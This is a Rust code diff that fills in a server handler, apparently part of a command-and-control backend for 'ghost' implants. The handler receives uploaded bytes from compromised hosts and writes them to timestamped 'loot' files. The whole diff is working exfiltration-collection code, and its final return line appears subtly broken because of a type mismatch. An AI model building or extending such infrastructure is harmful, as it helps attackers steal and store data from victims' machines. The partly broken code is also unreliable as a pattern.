@@ -187,8 +187,26 @@ async fn handle_ghost_heartbeat(
     Json(response)
 }
 
-async fn handle_ghost_upload() {
-    todo!("ghost exfiltration todo")
+async fn handle_ghost_upload(
+    State(_state): State<Arc<ServerState>>,
+    body: Bytes
+) -> Json<String> {
+    println!("receiving loot...");
+    let timestamp = chrono::Utc::now().timestamp();
+    let filename = format!("loot/loot_{}.dat", timestamp);
+
+    if let Err(e) = tokio::fs::create_dir_all("loot").await {
+        println!("ERROR failed to create loot dir: {}", e);
+        return Json("ERROR".to_string());
+    }
+
+    if let Err(e) = tokio::fs::write(&filename, body).await {
+        println!("ERROR failed to save loot: {}", e);
+        return Json("ERROR".to_string());
+    }
+
+    println!("loot saved to {}", filename);
+    Json("ACK").to_string()
 }
 
 // === CHARON
